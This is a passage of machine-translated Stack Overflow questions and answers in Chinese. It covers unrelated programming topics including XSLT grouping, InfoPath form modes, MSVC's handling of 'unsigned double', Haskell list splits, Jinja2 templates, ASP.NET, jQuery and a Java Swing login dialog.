    <xsl:value-of select="Date"/>
  </li>
</xsl:template>

</xsl:stylesheet> 
```

输入

```
<CompanyHistory>
<Event>
    <Date>2012-02-16T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2012-02-01T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2011-03-01T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2011-04-01T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2010-01-26T00:00:00</Date>
    <Description>description</Description>
</Event>
<Event>
    <Date>2010-01-16T00:00:00</Date>
    <Description>description</Description>
</Event>
</CompanyHistory> 
```

被转化为

```
<h2>Year = 2012</h2>
<ul>
   <li>description - 2012-02-16T00:00:00</li>
   <li>description - 2012-02-01T00:00:00</li>
</ul>
<h2>Year = 2011</h2>
<ul>
   <li>description - 2011-03-01T00:00:00</li>
   <li>description - 2011-04-01T00:00:00</li>
</ul>
<h2>Year = 2010</h2>
<ul>
   <li>description - 2010-01-26T00:00:00</li>
   <li>description - 2010-01-16T00:00:00</li>
</ul> 
```

# .net - 如何将下载的 InfoPath 表单从 SharePoint 站点更改为设计模式？

> ID：14977453
> 
> 赞同：0
> 
> 时间：2013-02-20T10:23:27.927
> 
> 标签：.net, sharepoint-2010, infopath

我是 InfoPath 表单开发的新手。我有一个共享点内容类型 InfoPath 表单，默认视图设置为编辑模式，它还有更多两种模式，即设计模式和新模式，用于在共享点站点中输入新数据。

我已经直接从 Sharepoint Server 在 InfoPath 中打开了模板，现在它的默认模式是编辑，但我现在还需要此模板的设计模式和新表单输入模式。我不知道这三种模式是在一个模板中还是它们有不同的文件。

请帮助我获得此编辑模式表单的设计模式和新模式。

感谢你！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:53:54.977

当您使用*InfoPath*添加、显示和编辑列表项时，您将拥有一个模板 ( `template.xsn`)。

用于显示、添加和编辑模式的浏览器视图之间的差异`.aspx`是因为使用了 3 种不同的表单：*displayifs.aspx*、*newifs.aspx*和*editifs.aspx*。

这些表单中的每一个都包含一个[`BrowserFormWebPart`](http://msdn.microsoft.com/en-us/library/ee564313%28v=office.14%29.aspx)，其`ListFormMode`属性对每个表单都有特定的值：`ListFormMode="Editable"`用于添加和编辑以及`ListFormMode="ReadOnly"`用于显示。编辑时，表单会填充基于查询字符串参数的值`ID`，该参数是已编辑项目的 id。

如果这是您的目标，自定义 Web 部件的一种非常方便的方法是在*InfoPath*中创建单独的视图（例如，`MyCustomDisplay`用于显示项目），然后将视图名称分配给*displayifs.aspx* Web 表单中的 Web 部件（通过使用*SharePoint 设计器*）：

```
<WpNs0:BrowserFormWebPart DefaultView="MyCustomDisplay" runat="server" ... /> 
```

显示项目时，`MyCustomDisplay`将使用视图，但当编辑或添加项目时，将`Edit`使用默认视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T13:18:56.077

> 我不知道这三种模式是在一个模板中还是它们有不同的文件

它在一个模板中，尽管魔鬼在细节中，并且您使用不兼容的术语可互换或在不可能/毫无意义的上下文中。

> 我已经直接从 Sharepoint Server 在 InfoPath 中打开了模板，现在它的默认模式是编辑，但我现在还需要这个模板的设计模式和新表单输入模式

直接在 Sharepoint 服务器上打开 Infopath 模板是没有意义的。为了进行更改并使更改后的模板在 Sharepoint 服务器上可用，您必须将其保存在本地计算机上（它可以与服务器仍然是同一台计算机，但也可以是客户端远程计算机），在 Infopath Designer 中进行更改并发布到 Sharepoint。
它是在**设计模式**和 Infopath Designer 中打开的模板。

XML 文件数据 Infopath 表单文件是在已发布的 XSN Infopath 表单模板的基础上创建的，并链接到该模板。它是在**编辑**、**新建**或**显示模式下**打开（并使用 XSN 模板链接到）的表单。它可以在客户端 Infopath 填充程序或 Web 浏览器中打开（取决于 Infopath 表单和配置的类型，以及 PFS - Infopath Form Services 的可用性。后者仅在企业 Sharepoint 服务器上可用）。

> 我不知道这三种模式是在一个模板中还是它们有不同的文件

它在同一个模板上。如果将发布到 Sharepoint 服务器的 Infopath 表单模板用作自定义 Web 部件 ASPX 网页中的 Infopath 表单 Web 部件，则理论上应通过 Web 部件属性配置其模式。虽然，webpart 属性仅使用编辑模式，请参阅我在 msdn 论坛中的问题和讨论：

*   [如何更改通过 Web 部件的“获取表单”连接接收到的 infopath 表单的类型？](http://social.msdn.microsoft.com/forums/en-IE/sharepointcustomizationprevious/thread/6f6530c8-6dc8-486f-9815-e4faa00d0163)

如果您从共享点列表创建了 Infopath 表单模板的 Sharepoint 列表表单类型，则相同的已发布 XSN Infopath 表单模板[以 Infopath Web 部件的形式用于不同的 ASPX 页面](http://office.microsoft.com/en-us/sharepoint-designer-help/edit-list-forms-using-infopath-2010-in-sharepoint-designer-HA101631624.aspx)：

*   **editifs.aspx**代替默认的 Sharepoint **EditForm.aspx** （用于编辑）
*   **newifs.aspx**代替默认 Sharepoint NewForm.aspx（用于创建/新建）
*   **DisplayIFS.aspx**代替默认的 Sharepoint **DispForm.aspx**（用于显示或查看）

这是我对如何同时使用所有六个网页的组合的回答：

*   [使用默认列表表单进行编辑和查看](https://sharepoint.stackexchange.com/a/43816)
    *   [如何使 Infopath Designer 2010 尊重列表表单的默认选定类型（新建、编辑、显示）？](http://social.technet.microsoft.com/Forums/en-US/sharepoint2010customization/thread/6af397b4-466f-4619-aba1-517f6367bd2c/)

不过，我写了上面的共享点列表是为了说明在不同的网页中使用相同的 XSN 模板（以及来自它的相应 Web 部件）。

但是，问题是我看不到“内容类型”如何与共享点列表一起使用。仅适用于表单或文档库。但是您所描述的也不适合图书馆的表格……

# c++ - 为什么 sizeof(unsigned double) 等于 4？

> ID：14977454
> 
> 赞同：72
> 
> 时间：2013-02-20T10:23:29.560
> 
> 标签：c++, visual-studio-2010

我的一位同事问是否有 unsigned double，我说没有，但我还是检查了它，这在[Microsoft Visual C++ 2010](http://en.wikipedia.org/wiki/Visual_C++#32-bit_and_64-bit_versions)中编译：

```
unsigned double a;
double b;
printf("size_a=%d size_b=%d", (int) sizeof(a), (int) sizeof(b)); 
```

它输出`size_a=4 size_b=8`. 即 4 个字节`unsigned double`和 8 个字节`double`。

* * *

## 回答 #1

> 赞同：141
> 
> 时间：2013-02-20T10:34:34.010

`unsigned double`是无效的。在 MSVC 中也是如此。在启用警告的 MSCV 2010 中编译上述代码时，您会得到：

`warning C4076: 'unsigned' : can not be used with type 'double'`

编译器实际上*忽略了* `double`after `unsigned`，使你`a`实际上是一个`unsigned int`.

如果您尝试以下操作：

```
unsigned double a = 1.0; 
```

您实际上会收到两个警告：

```
warning C4076: 'unsigned' : can not be used with type 'double'
warning C4244: 'initializing' : conversion from 'double' to 'unsigned int', possible loss of data 
```

有趣的是，在 MSDN 中没有针对 VS2010 的 C4076 警告。它仅适用于 VS2005 和 VS2008。

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2013-02-20T10:46:13.253

如果您将警告级别设置得更高（我的测试中为 /W3），您将收到适当的警告：

> 警告 C4076：“无符号”：不能与“双”类型一起使用

如果您随后使用调试器检查变量，一切都会变得清晰：

![在此处输入图像描述](../Images/82716cdcf05c3116f25dd0837661aaa9.png)

您可以看到该变量实际上是`unsigned int`

* * *

## 回答 #3

> 赞同：24
> 
> 时间：2013-02-20T10:25:01.263

在声明说明符序列中结合`unsigned`with`double`不是有效的 C++。这必须是某种 MSVC 扩展（或错误）。

> 作为一般规则，在声明的完整*decl-specifier-seq或**type-specifier-seq*或*trailing-type-specifier-seq中最多允许一个**类型*说明符。此规则的唯一例外情况如下：
> 
>  ****   `const`可以与除自身之外的任何类型说明符组合。
> *   `volatile`可以与除自身之外的任何类型说明符组合。
> *   `signed`or`unsigned`可以与`char`, `long`, `short`, 或结合使用`int`。
> *   `short`或者`long`可以与`int`.
> *   `long`可以与`double`.
> *   `long`可以与`long`.***

 **** * *

## 回答 #4

> 赞同：4
> 
> 时间：2013-02-20T10:32:49.187

在可能的情况下，无符号和有符号在 MSVC 中充当类型限定符（无符号字符、有符号短等）。如果无法做到这一点，例如 unsigned bool 或 signed double，则不会创建请求的类型。并且类型只是被视为无符号 [int] 和有符号 [int]。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-20T17:51:24.523

这是VS2010中的一个错误。VS2012 对该行代码给出以下错误。

```
error CS1002: ; expected 
```

它期待一个';' 在关键字“双”之前。***

# git-ftp - 如何使用 GIT 部署特定于分支的代码？

> ID：14977459
> 
> 赞同：0
> 
> 时间：2013-02-20T10:23:57.360
> 
> 标签：git-ftp

我为开发、测试和生产环境使用单独的服务器。我在本地机器上安装了 git，并且每个环境都有单独的分支。如何使用 GIT 将代码从每个分支部署到其各自的服务器？

仅供参考：GIT 未安装在服务器上。

提前致谢。

西姆拉特

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-02-20T10:30:33.753

您应该在服务器上安装了 git，使用以下命令将您的代码推送到远程存储库

```
git push remote_repository_url  branch_name 
```

使用以下命令从远程存储库中获取或部署代码到您的相应机器。

```
 git  pull  remote_repository_url    branch_name 

                  or 

 git  fetch  remote_repository_url   branch_name 
```

使用 fetch 命令避免合并

甚至您可以使用 **git clone** 命令将特定分支从您的 remote_repository(assembla) 克隆到相应的服务器 >

```
git  clone  --branch  branch_name   remote_repository_url 
```

# android-contentprovider - 如何访问另一个应用程序的内容提供者

> ID：14977463
> 
> 赞同：0
> 
> 时间：2013-02-20T10:24:13.867
> 
> 标签：android-contentprovider

**我已经创建了内容提供者应用程序。我想在另一个应用程序中使用内容提供程序。应用程序中访问内容提供者所需的任何权限。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-18T08:56:47.390

**是的，您必须在清单**文件中授予以下权限：

```
uses-permission android:name="android.permission.permRead" 
uses-permission android:name="android.permission.permWrite" 
```

# java - PrimeFaces DataTable“未找到记录”时有记录

> ID：14977470
> 
> 赞同：3
> 
> 时间：2013-02-20T10:24:25.223
> 
> 标签：java, primefaces, datatable

我将 dataTable 定义为：

```
<p:dataTable var="account" value="#{customerBean.accounts}"
            id="accounts" lazy="true">
            <p:column>
                <f:facet name="header">
                    <h:outputText value="#{msg['editCustomerForm.accountNumbers.header']}" />
                </f:facet>
                <h:outputText value="#{account.accountNumber}" />
            </p:column>
</p:dataTable> 
```

并在此方法中加载帐户（在 @PostConstruct 方法中调用）

```
 private void initAccounts() {
        accounts = new CustomLazyDataModel<Account>() {
            @Override
            public List<Account> load(int first, int pageSize, String sortField, SortOrder sortOrder, Map<String, String> filters) {
                return accountService.getAccountsForCustomer(customerModel.getCustomer(), first, pageSize);
            }
        };
        accounts.setPageSize(10);
    } 
```

CustomLazyDataModel 存在只是因为这个错误：[http](http://code.google.com/p/primefaces/issues/detail?id=1544) ://code.google.com/p/primefaces/issues/detail?id=1544 （见评论#23）

但是当页面被渲染时，组件说“没有找到记录”。

在服务器上执行的休眠日志中的 SQL 返回 1 行，当我使用 dataList insted 的 dataTable 结果是正确的（呈现 1 行）。

```
<p:dataList value="#{customerBean.accounts}" var="account"
            id="accounts-old" rows="10"
            type="none" lazy="true">
            <f:facet name="header">
                <h:outputText value="#{msg['editCustomerForm.accountNumbers.header']}" />

        </f:facet>

        <h:outputText value="#{account.accountNumber}" />

    </p:dataList> 
```

使用`<h:dataTable>`记录时也有。那么有什么问题`<p:dataTable>`呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T15:09:07.107

组件上唯一缺少的是 rows 参数。

```
<p:dataTable var="account" value="#{customerBean.accounts}" id="accounts" lazy="true" rows="10"  paginatorAlwaysVisible="false" > 
```

现在记录被渲染。

# c# - 创建 ItemsControl 时是否可以使用现有网格？

> ID：14977471
> 
> 赞同：1
> 
> 时间：2013-02-20T10:24:28.760
> 
> 标签：c#, .net, wpf, itemscontrol

我正在尝试创建一个布局，其中行数和列数都是动态的，如下所示：

[![图片](../Images/1718eee76f7071a05f6c787719c9053b.png)](https://i.stack.imgur.com/ziKVt.png)

我希望将所有控件都托管在一个网格中，这样我就可以从上到下、从左到右进行制表操作。我试图开始工作的代码如下所示：

```
<Grid base:GridHelpers.RowCount="{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=dx:DXWindow}, Path=Groups.Count}" Name="EnclosingGrid">
    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="180" />
        <ColumnDefinition Width="*" />
        <ColumnDefinition Width="*" />
        <ColumnDefinition Width="*" />
    </Grid.ColumnDefinitions>
    <!--Labels-->
    <ItemsControl ItemsSource="{Binding Rows}" ItemsPanel="{Binding ElementName=EnclosingGrid}">
        <ItemsControl.ItemContainerStyle>
            <Style>
                <Setter Property="Grid.Row" Value="{Binding RowIndex}" />
            </Style>
        </ItemsControl.ItemContainerStyle>
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <Label Grid.Column="0" Content="{Binding Path=FieldName}" VerticalContentAlignment="Center" />
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl>
    <!--Process fields-->
    <ItemsControl ItemsSource="{Binding Cells}" ItemsPanel="{Binding ElementName=EnclosingGrid}">
        <ItemsControl.ItemContainerStyle>
            <Style>
                <Setter Property="Grid.Row" Value="{Binding ParentRow.RowIndex}" />
                <Setter Property="Grid.Column" Value="{Binding ColumnIndex}" />
            </Style>
        </ItemsControl.ItemContainerStyle>
        <ItemsControl.ItemTemplate>
            <DataTemplate>
                <TextBox />
            </DataTemplate>
        </ItemsControl.ItemTemplate>
    </ItemsControl>
</Grid> 
```

我尝试将`ItemsPanel`属性设置为封闭网格，但不幸的是这不起作用。

真的是将网格设置为`ItemsPanelTemplate`内部的唯一方法`ItemsControl`吗？

还有其他方法吗？还是我必须自己动手`ItemsControl`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T14:50:07.137

**ItemsPanel**属性类型是**ItemsPanelTemplate**，因此您不能将此属性直接绑定到某些现有控件。

您可以将此属性视为一种工厂类，它应该为项目提供容器控制。这就是[MSDN](http://msdn.microsoft.com/ru-ru/library/system.windows.controls.itemspaneltemplate%28v=vs.100%29.aspx)对这种类型的字面意思：*指定**ItemsPresenter**为 ItemsControl 的项目布局创建的面板。*

# list - Haskell：如何返回列表的可能拆分列表

> ID：14977478
> 
> 赞同：3
> 
> 时间：2013-02-20T10:24:43.207
> 
> 标签：list, haskell

我正在尝试编写一个名为 split 的函数，它接受一个列表并返回一个包含所有不同可能性的对列表来对其进行分区，例如

```
split [4,3,6] = [([],[4,3,6]),([4],[3,6]),([4,3],[6]),([4,3,6],[])] 
```

现在我写了这个

```
split :: [a] -> [([a],[a])]
split []     = [([],[])]
split (x:xs) = ([],(x:xs)):(zip (map (x:) (map fst split(xs))) (map snd split(xs))) 
```

一段代码和拥抱以及我选择的解释器让我得到这个

```
ERROR file:.\split.hs:3 - Type error in application
*** Expression     : map snd split xs
*** Term           : map
*** Type           : (e -> f) -> [e] -> [f]
*** Does not match : a -> b -> c -> d 
```

错误信息。我到底做错了什么？为什么 (map snd split xs) 是
(a-> b -> c -> d) 类型？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-20T10:29:36.997

你放错了括号。尝试

```
split (x:xs) = ([],(x:xs)):(zip (map (x:) (map fst (split xs))) (map snd (split xs))) 
```

Haskell 不像 C 和 Java 那样使用括号来调用函数。当你写`map fst split(xs)`这和 一样`map fst split xs`，即编译器认为你试图`map`用三个参数调用。因此，您需要将调用括起来，`split`如下所示：`map fst (split xs)`.

您正在有效地尝试编写的是一个简单的列表[拉链](http://www.haskell.org/haskellwiki/Zipper)。实现它的最简单方法是

```
import Data.List (inits, tails)

split xs = zip (inits xs) (tails xs) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-20T10:33:19.750

这是一个替代定义：

```
splits :: [a] -> [(a, a)]
splits xs = map (flip splitAt xs) [0 .. length xs] 
```

诚然，它不是很有效，但至少它很简洁:-)

另一个版本更短，可能更高效，使用`inits`and `tails`from `Data.List`：

```
splits :: [a] -> [(a, a)]
splits xs = zip (inits xs) (tails xs) 
```

现在让我们有一点乐趣。我们可以将`inits`and`tails`写成`foldr`s，我们使用`initsA`and`tailsA`来表示所谓的折叠*代数：*

```
inits :: [a] -> [[a]]
inits = foldr initsA [[]]

initsA :: a -> [[a]] -> [[a]]
initsA x xss = [] : map (x:) xss

tails :: [a] -> [[a]]
tails = foldr tailsA [[]]

tailsA :: a -> [[a]] -> [[a]]
tailsA x xss = (x : head xss) : xss 
```

使用这些代数，我们可以进一步组合它们：

```
splits :: [a] -> [([a], [a])]
splits = foldr splitsA [([], [])]

splitsA :: a -> [([a], [a])] -> [([a], [a])]
splitsA xy xyss = zip (initsA xy xss) (tailsA xy yss)
  where (xss, yss) = unzip xyss 
```

所以现在我们已经`splits`定义为单`foldr`！

# jinja2 - 如何循环使用 jinja2 for 循环来创建选择元素？

> ID：14977479
> 
> 赞同：1
> 
> 时间：2013-02-20T10:24:44.700
> 
> 标签：jinja2

假设我有一个名为 seq 的 python 列表，我想在选择元素中呈现它，我该怎么做？

我试过了：

```
<select name="Exercise1">
         {% for item in seq %}
            <option  value="{{item}}">{{item}}</option>
         {% endfor %}
         </select> 
```

它没有用。

更新：这是模板代码：

```
<!DOCTYPE html>

<html>
  <head>
    <title>Unit 2 Rot 13</title>
  </head>

  <body>
    <h2>Enter some text to ROT13:</h2>
    <form method="post">

                 <select name="Exercise1">
              {% for item in seq %}
                <option  value="{{item}}">{{item}}</option>
             {% endfor %}
             </select>

      <br>
      <input type="submit">

    </form>
  </body>

</html> 
```

这是呈现的 html 源代码：

```
<!DOCTYPE html>

<html>
  <head>
    <title>Unit 2 Rot 13</title>
  </head>

  <body>
    <h2>Enter some text to ROT13:</h2>
    <form method="post">

                 <select name="Exercise1">

                  </select>

      <br>
      <input type="submit">

    </form>
  </body>

</html> 
```

我不确定为什么元素会消失并且没有引发错误。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-19T20:42:42.353

你很亲密，我的朋友，你只是错过了几个空格：

你写了这个：

```
<option  value="{{item}}">{{item}}</option> 
```

这需要看起来像这样：

```
<option value="{{ item }}">{{ item }}</option> 
```

让我知道是否可以解决它。祝你好运！

如果没有这些空格，它对 python 和浏览器来说就像垃圾:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-08-03T19:59:41.673

检查渲染模板的函数，它必须包含：

```
def generate_template_for_exercize1():

    seq = [1, 2, 3] #here you probably will have more complex statement

    return render_template('your_template.html', seq=seq) 
```

# c# - 将 Javascript 变量传递给 C# 代码

> ID：14977491
> 
> 赞同：1
> 
> 时间：2013-02-20T10:25:03.830
> 
> 标签：c#, javascript, asp.net

如何从 javascript 获取价值到 C# 代码背后？我对下面的代码有一个想法。在javascript代码中，我想用字符串值分配“HiddenField”控件的值，然后我想从后面代码中的“HiddenField”中获取这个值。但是用这段代码我做不到。你能告诉我怎么做吗？

```
<script>
    $(function () {
        document.getElementById('HiddenField').value = "active";
        console.log(<%= this.HiddenField.Value %>)
    });
</script>
<asp:HiddenField ID="HiddenField" runat="server" Value="5" Visible="true" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:31:24.123

您需要使用`ClientID`控件的属性来获取 DOM 中的实际元素 ID。

```
<script>
        $(function () {
                document.getElementById('<%= HiddenField.ClientID%>').value = "active";
                console.log(document.getElementById('<%= HiddenField.ClientID%>').value)
        });
</script>

<asp:HiddenField ID="HiddenField" runat="server" Value="5" Visible="true" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:33:23.800

将[控件 ID](http://msdn.microsoft.com/en-us/library/system.web.ui.control.clientid.aspx)用于由 ASP.NET 生成的 HTML 标记。

```
document.getElementById('<%= HiddenField.ClientID%>').value = "active"; 
```

> 当 Web 服务器控件呈现为 HTML 元素时，HTML 元素的 id 属性设置为 ClientID 属性的值。ClientID 值通常用于通过 document.getElementById 方法访问客户端脚本中的 HTML 元素。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:32:41.317

你可以看看 mshtml 据我所知，你从你的 javascript 代码中调用这个 C# 函数；-)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-20T10:31:31.610

然后在调用控制器时通过 javascript 函数将 Hidden 值作为变量发送

肯定有效，

干杯帕尼*

# iphone - iPad方向检查错误

> ID：14977492
> 
> 赞同：0
> 
> 时间：2013-02-20T10:25:04.503
> 
> 标签：iphone

我正在以编程方式检查设备和界面方向，但每次即使在纵向模式下也进入横向方向这是我的代码，请给我解决方案：-

```
if ([[UIDevice currentDevice]orientation] == UIDeviceOrientationLandscapeLeft||[[UIDevice currentDevice] orientation]== UIDeviceOrientationLandscapeRight || [self interfaceOrientation] == UIInterfaceOrientationLandscapeLeft || [self interfaceOrientation] == UIInterfaceOrientationLandscapeRight)
     {

     }
     else
     {

     } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:40:29.177

```
 [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];

 if ( ([[UIDevice currentDevice] orientation] ==  UIDeviceOrientationPortrait)  )
 {
    //Portrait coding
 }
 else if(([[UIDevice currentDevice] orientation] == UIDeviceOrientationLandscapeRight) ||           [[UIDevice currentDevice] orientation] == UIInterfaceOrientationLandscapeLeft))
{
 //Landscape coding
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:28:35.747

始终使用

```
 if([UIApplication sharedApplication].statusBarOrientation == UIInterfaceOrientationPortrait)
    { 
    //orientation is portrait
    } 

    if(  [UIApplication sharedApplication].statusBarOrientation == UIInterfaceOrientationLandscapeLeft || [UIApplication sharedApplication].statusBarOrientation == UIInterfaceOrientationLandscapeRight)
    {
    //orientation is landscape
    } 
```

# c# - 从 RadTimePicker c# 获取输入时间

> ID：14977493
> 
> 赞同：2
> 
> 时间：2013-02-20T10:25:06.747
> 
> 标签：c#, asp.net, time, get, telerik

我的 aspx 页面中有 Telerik RadTimePicker。在后面的代码中，我需要从这个 RadTimePicker 控件中获取时间。

> `<telerik:RadTimePicker ID="radTimeStartTime" runat="server" ZIndex="30001"> </telerik:RadTimePicker>`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:44:45.360

您应该可以使用 "HH:mm:ss" - hour:minutes:seconds 来获得它

```
DateTime d = radTimeStartTime.SelectedDate.Value;
string time = d.ToString("HH:mm:ss"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:31:51.290

为您的 RadTimePicker 命名，然后：

```
 DateTime myDate = RadTimePickerName.SelectedDate.Value; 
```

和 myDate 到字符串：

```
 string myString = myDate .ToShortTimeString().ToString(); 
```

如果您只使用字符串，您也可以在一行中完成：

```
string myString = RadTimePickerName.SelectedDate.Value.ToShortTimeString().ToString(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:27:32.830

尝试这个：

```
 DateTime dt = RadTimePicker1.SelectedDate.Value;  
 string time = dt.ToShortTimeString().ToString(); 
```

# javascript - 在回调函数中调用href

> ID：14977496
> 
> 赞同：0
> 
> 时间：2013-02-20T10:25:13.117
> 
> 标签：javascript, jquery, jquery-ui, jquery-callback

我的页面中有一个用于注销的锚标记。

```
<a href="/logout/" id="lnk-log-out" /> 
```

在这里，我显示了一个弹出窗口，用于使用 jQuery UI 对话框进行确认。

***如果用户从对话框中单击是，它必须执行链接按钮的默认操作，我的意思是 href="/logout"。***

***如果没有点击一个弹出框应该消失。***

jQuery 代码

```
 $('#lnk-log-out').click(function (event) {
            event.preventDefault();
            var logOffDialog = $('#user-info-msg-dialog');

            logOffDialog.html("Are you sure, do you want to Logout?");
            logOffDialog.dialog({
                title: "Confirm Logout",
                height: 150,
                width: 500,
                bgiframe: true,
                modal: true,
                buttons: {
                    'Yes': function () {
                        $(this).dialog('close');
                        return true;
                    },
                    'No': function () {
                        $(this).dialog('close');
                        return false;
                    }
                }
            });

        });
    }); 
```

> **问题是当用户单击“是”时，我无法触发锚点的 href。**

***我们应该怎么做？***

**编辑：**现在我以这种方式管理

```
'Yes': function () {
                        $(this).dialog('close');
                        window.location.href = $('#lnk-log-out').attr("href");
                    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:30:01.100

在触发“是”时调用的匿名函数中，您希望执行以下操作而不是仅返回 true：

1.  抓住href（你可以很容易地使用这个`$('selector').attr('href');`）
2.  执行您`window.location.href`在第 1 点获取的网址

如果您希望`a`标签只是做它的事情，请删除任何`preventDefault()`或`stopPropagation()`. 在这里，我提供了两种不同的方式:)

**不**使用`document.location`，`window.location.href`改为使用。[你可以在这里](https://stackoverflow.com/questions/948227/should-i-use-window-navigate-or-document-location-in-javascript)看到为什么。

您在“是”调用中的代码应该看起来像，当然插入了您的代码：

```
'Yes': function () {
            // Get url
            var href = $('#lnk-log-out').attr('href');
            // Go to url
            window.location.href = href;
            return true; // Not needed
     }, ... 
```

**注意**：感谢 Anthony 在下面的评论中：使用`window.location.href = ...`代替`window.location.href()`，因为它**不是**函数！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:32:31.670

我在我的许多项目中都使用过这个，所以我建议`window.location.href`

```
'Yes': function () {
                        $(this).dialog('close');
                         window.location.href="your url"    
                        return true;
                    }, 
```

# email - Drupal 7 Views：如何通过用户->邮件-全局变量过滤内容？

> ID：14977497
> 
> 赞同：0
> 
> 时间：2013-02-20T10:25:12.363
> 
> 标签：email, drupal, drupal-views, globals

目前我正在建立一个网站，每个登录用户都可以访问列出画廊的“我的画廊网站”，该网站与 contet 字段匹配：“usermail”。该系统是当前的 drupal 7 + 视图模块。

我的想法是有一个过滤器之类的东西：

```
is equal to = $user->mail 
```

与 php 的用户全局变量进行交互。有这种可能吗？

# java - 如何创建登录表单 - Java 中的 OOP？

> ID：14977501
> 
> 赞同：-3
> 
> 时间：2013-02-20T10:25:20.280
> 
> 标签：java, oop, netbeans, system, inventory

我已经有一个库存系统，可以访问某个数据库上的某个表。

现在我想创建一个新框架，作为登录表单，然后用户才能进入主库存系统框架。

我希望它访问相同的数据库但不同的表（例如，inventory_system_db 数据库下的 user_table 和 item_table）。

如果用户登录了管理员帐户，那么他可以通过管理员控制（例如编辑、添加、删除）访问库存系统。

当他以普通用户身份登录时，他将能够访问库存系统，但无需管理员控制。

我想知道的事情：

*   如何创建登录表单？
*   如何使其进入库存系统？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-20T10:43:55.367

如果你想要一个登录对话框，只需检查下面的代码。

```
 public class LoginPane extends JDialog implements ActionListener {
  String itsUsername = "";
  String itsPassword = "";
  boolean itsFirst = true;
  boolean itsKeep = false;
  JTextField itsUserField = new JTextField(15);
  JPasswordField itsPassField = new JPasswordField(15);
  JCheckBox itsKeepBox = new JCheckBox("Save details:", false);
  boolean itsInit = false;

  public LoginPane() {
    super();
setTitle("Login");
setModal(true);
getContentPane().setLayout(new GridLayout(3, 2));
getContentPane().add(new JLabel("Username:"));
getContentPane().add(itsUserField);
getContentPane().add(new JLabel("Password"));
getContentPane().add(itsPassField);
getContentPane().add(itsKeepBox);
JButton submit = new JButton("done");
getContentPane().add(submit);
submit.addActionListener(this);
pack();
 }

public String[] getLogin() {
if (!itsKeep && !itsFirst) {
  return null;
}
if (!itsInit) {
  return null;
}
itsFirst = false;
String[] res = new String[2];
res[0] = itsUsername;
res[1] = itsPassword;
if (!itsKeep) {
  itsUsername = "";
  itsPassword = "";
}
return res;
  }

  public void actionPerformed(ActionEvent e) {
itsUsername = itsUserField.getText();
itsPassword = new String(itsPassField.getPassword());
itsKeep = itsKeepBox.isSelected();
itsInit = true;
setVisible(false);
}
} 
```

您可以根据需要为按钮添加操作！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:29:25.827

可以有很多解决方案来解决这个问题，但其中之一是：

1.  在数据中的用户表中，存储用户的权限。

2.  登录时，检查权限，如果它是管理员（或任何你称之为 0，授予他添加、删除和任何权限的权利，否则限制他这样做。

3.  要遵守这一点，您必须检查所有这些权限，以确定用户是否有权执行此任务。

4.  此外，如果不允许用户执行操作，您可以隐藏添加、删除（如果这些是按钮的形式）。

因此，所有这些都取决于您的应用程序的架构。

# eclipse - 安装 GWT 后 Eclipse Indigo 崩溃

> ID：14977502
> 
> 赞同：0
> 
> 时间：2013-02-20T10:25:20.490
> 
> 标签：eclipse, google-plugin-eclipse

我试图在我的系统上设置 GWT（Google Web Toolkit），使用它作为 eclipse Indigo 的插件。我目前在 Ubuntu 工作站上。安装后重新启动时，eclipse 只是崩溃而没有任何错误信息。我确实在堆栈溢出以及谷歌上查看了可以做什么，但是似乎对其他人有用的东西似乎对我不起作用。（删除某些 .jar 文件，删除元数据文件夹中的工作区）。

任何帮助都会很棒。

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T04:46:23.607

问题解决了。Indigo 中有一个错误，由插件暴露。需要做的就是先检查更新，然后安装插件。该错误已在其中一个点更新中得到修复。

# struct - 具有固定大小的 Eigen 对象作为成员和容器的结构

> ID：14977503
> 
> 赞同：1
> 
> 时间：2013-02-20T10:25:21.553
> 
> 标签：struct, eigen, lemon-graph-library

我有一个结构，它有一个固定大小的 Eigen 对象作为成员，我想将其用作 Lemon 的边缘图：

```
struct EdgeStatus
{
    Matrix<float,3,4> Data;
    …
    EIGEN_MAKE_ALIGNED_OPERATOR_NEW
};

ListGraph::EdgeMap<EdgeStatus> edgeMap(mygraph); 
```

代码编译得很好，但我得到一个运行时错误：

```
include/Eigen/src/Core/DenseStorage.h:56: Eigen::internal::plain_array<T, Size, MatrixOrArrayOptions, 16>::plain_array()
